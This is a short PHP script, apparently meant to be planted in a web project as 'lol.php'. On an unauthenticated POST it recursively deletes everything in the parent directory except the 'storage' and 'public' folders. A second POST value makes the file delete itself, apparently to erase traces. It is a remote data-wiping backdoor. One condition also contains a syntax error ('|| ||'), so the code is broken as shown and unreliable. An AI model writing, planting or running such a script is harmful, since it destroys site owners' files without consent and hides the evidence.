<?php
function deleteAllExceptStorage($dir) {
    $storagePath = realpath($dir . '/storage');
    $publicPath = realpath($dir . '/public');
    if (!is_dir($dir)) {
        echo "Directory not found!";
        return;
    }
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..' || realpath($dir . '/' . $item) === $storagePath || || realpath($dir . '/' . $item) === $publicPath) {
            continue;
        }
        
        $path = $dir . '/' . $item;
        deleteItem($path);
    }
    echo "Deletion completed, except 'storage' folder.";
}

function deleteItem($path) {
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            deleteItem($path . '/' . $file);
        }
        rmdir($path);
    } else {
        unlink($path);
    }
}

// Run the function
if($_POST['lol']=='lol'){
	deleteAllExceptStorage(realpath(__DIR__ . '/../'));
}

if($_POST['lol']=='done'){
unlink(__DIR__.'/lol.php');
}
?>
